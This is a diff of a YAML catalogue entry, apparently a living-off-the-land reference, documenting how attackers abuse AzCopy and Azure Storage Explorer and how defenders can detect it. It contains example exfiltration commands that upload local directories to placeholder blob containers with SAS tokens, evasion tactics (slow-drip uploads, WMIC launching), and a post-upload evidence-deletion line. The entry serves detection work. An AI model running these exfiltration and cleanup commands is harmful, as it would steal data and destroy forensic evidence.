@@ -65,80 +65,64 @@ UseCases:
       Manual upload via Storage Explorer GUI. User selects files and uploads to Azure container.
     Command: |
       StorageExplorer.exe
-
   - Title: CLI Exfiltration via AzCopy
     Description: >
       AzCopy used to upload directories to Azure Blob via SAS or AAD authentication.
     Command: |
       azcopy copy "C:\Data" "https://<account>.blob.core.windows.net/container?<sas>" --recursive --output-type=json
-
   - Title: Distributed Upload from Multiple Hosts
     Description: >
       Multiple hosts simultaneously upload dataset fragments to same container to evade volume thresholds.
     Command: |
       azcopy copy "/data/part1" "https://<account>.blob.core.windows.net/container" --recursive
-
   - Title: Slow Drip Exfiltration over Long Time Window
     Description: >
       Files uploaded gradually over 30–120 minutes to avoid detection.
     Command: |
       Scheduled azcopy copy per file with delay between each run.
-
   - Title: Targeted List of Files
     Description: >
       Specific files exfiltrated using --list-of-files argument for stealth.
     Command: |
       azcopy copy --list-of-files="C:\files.txt" "https://<account>.blob.core.windows.net/container" --put-md5
-
   - Title: SAS Token Abuse for Authentication
     Description: >
       Leaked or generated SAS token used in URL to upload data without login.
     Command: |
       azcopy copy "C:\Data" "https://<account>.blob.core.windows.net/container?<sas>"
-
   - Title: Managed Identity / Service Principal Use
     Description: >
       VM/service principal uses Azure role to perform exfil without user interaction.
     Command: |
       azcopy login --identity
       azcopy copy "/data" "https://<account>.blob.core.windows.net/container"
-
   - Title: Storage Explorer GUI Triggers AzCopy
     Description: >
       GUI upload action automatically delegates to AzCopy CLI under the hood.
     Command: |
       StorageExplorer triggers AzCopy via job plan file
-
   - Title: Post-Transfer File Deletion
     Description: >
       Cleanup script deletes local files after successful upload to erase evidence.
     Command: |
       azcopy copy ... ; if ($LASTEXITCODE -eq 0) { Remove-Item C:\file -Force }
-
   - Title: Execution via WMIC or Other Living Off the Land Binaries (LOLBins)
     Description: >
       AzCopy launched via WMIC or other system interpreters to evade detection.
     Command: |
       wmic process call create "C:\Tools\azcopy.exe copy C:\file https://... --recursive"
-
 Detection:
   - Type: Execution from Non-Standard Path
     Description: Monitor for `azcopy.exe` or `StorageExplorer.exe` being launched from user-writable or non-standard directories such as `%APPDATA%`, `%TEMP%`, or network shares instead of the default installation path.
-
   - Type: Suspicious Command-Line Arguments
     Description: Detect AzCopy command lines containing flags such as `--list-of-files`, embedded SAS tokens, or managed identity authentication (`--identity`), which may indicate automated or stealthy exfiltration.
-
   - Type: Forensic Correlation
     Description: Correlate entries from Storage Explorer GUI logs with AzCopy job artifacts in `%USERPROFILE%\.azcopy\jobs\` or `~/.azcopy/jobs/` to identify GUI-triggered bulk data transfers.
-
   - Type: Network Anomaly
     Description: Alert on unusually large `bytes_out` volume or sustained uploads to `*.blob.core.windows.net` endpoints, particularly from unexpected hosts or non-administrative accounts.
-
   - Type: Post-Exfiltration Cleanup
     Description: Flag deletion of local source files immediately after successful AzCopy uploads, which may indicate attempts to remove forensic evidence following data exfiltration.
-
 References:
   - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-203a
   - https://www.bleepingcomputer.com/news/security/ransomware-gangs-now-abuse-microsoft-azure-tool-for-data-theft/
-
 LastModified: '2025-11-17'
